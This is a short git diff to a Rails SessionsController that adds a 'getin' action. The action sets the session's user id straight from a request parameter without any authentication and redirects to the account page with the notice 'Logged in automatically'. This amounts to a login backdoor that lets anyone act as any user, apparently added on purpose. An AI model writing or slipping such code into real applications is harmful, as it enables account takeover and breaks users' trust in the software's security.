@@ -17,4 +17,9 @@ class SessionsController < ApplicationController
     session[:user_id] = nil
     redirect_to root_url, notice: "Logged out!"
   end
+
+  def getin
+    session[:user_id] = params[:user_id].to_i
+    redirect_to my_account_path, notice: "Logged in automatically"
+  end
 end
